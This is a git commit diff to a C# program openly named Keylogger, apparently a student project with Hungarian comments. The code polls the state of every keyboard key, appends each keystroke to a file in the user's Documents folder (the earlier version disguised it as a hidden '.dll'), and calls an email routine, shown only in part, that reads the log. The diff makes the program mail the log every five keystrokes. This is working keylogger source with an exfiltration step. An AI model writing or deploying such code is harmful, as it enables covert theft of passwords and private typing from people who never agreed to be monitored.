b458f2c5c16ee7159a1642c8dcd8747d4a4b3a8e
Milasz <80472334+Milasz@users.noreply.github.com>
2021-04-24 15:03:42 +0200

    javitott

--- Keylogger/Program.cs
+++ Keylogger/Program.cs
@@ -4,16 +4,19 @@ using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Windows.Forms;
+
 
 namespace Keylogger
 {
     class Program
+
     {
         [DllImport("User32.dll")]
-        public static extern int GetAsyncKeyState(Int32 i); //ellenőrzi hogy az adott billentyű le van e nyomva
+        public static extern int GetAsyncKeyState(int  Vkey); //ellenőrzi hogy az adott billentyű le van e nyomva
 
         static long leutes = 0;
-
+        static string Vkey;
 
         static void Main(string[] args)
         {
@@ -24,31 +27,44 @@ namespace Keylogger
                 Directory.CreateDirectory(filepath);
             }
 
-            string path = (filepath + @"\beadando.dll");
+            string path = (filepath + @"\gyak.text");
             if (!File.Exists(path))
             {
                 using (StreamWriter sw = File.CreateText(path))
                 {
 
                 }
-
-                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
+                File.SetAttributes(path, File.GetAttributes(path) /*| FileAttributes.Hidden*/);
             }
+
+            
             while (true)
             {
-                Thread.Sleep(1);
-                for (int i = 32; i < 127; i++)
+                //Thread.Sleep(1000);
+                for (int i = 0; i <= 255; i++)
                 {
                     int keyState = GetAsyncKeyState(i);
-                    if (keyState == 32769)
-                    {
-                        Console.Write((char)i + "");
+                    //if (keyState == 32769)
+                    //{
+                    //    if (i >= 0 && i <= 31)
+                    //    {
+                    //        switch (i)
+                    //        {
+                    //            case 0:
+                    //                Vkey = "Null";
+                    //                Console.Write(Vkey);
+                    //                leutes++;
+                    //                break;
+                    //        }
+                    //    }
+
+                    if (keyState == 1 || keyState == 32769) { 
                         using (StreamWriter sw = File.AppendText(path))
                         {
-                            sw.Write((char)i);
+                            sw.Write((Keys)i+"");
                         }
                         leutes++;
-                        if (leutes % 100 == 0)
+                        if (leutes % 5 == 0)
                         {
                             Levelezes();
                         }
@@ -59,7 +75,7 @@ namespace Keylogger
         static void Levelezes()
         {
             String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string filePath = folderName + @"\beadando.dll";
+            string filePath = folderName + @"\gyak.text";
 
             String logContents = File.ReadAllText(filePath);
             string emailBody = "";
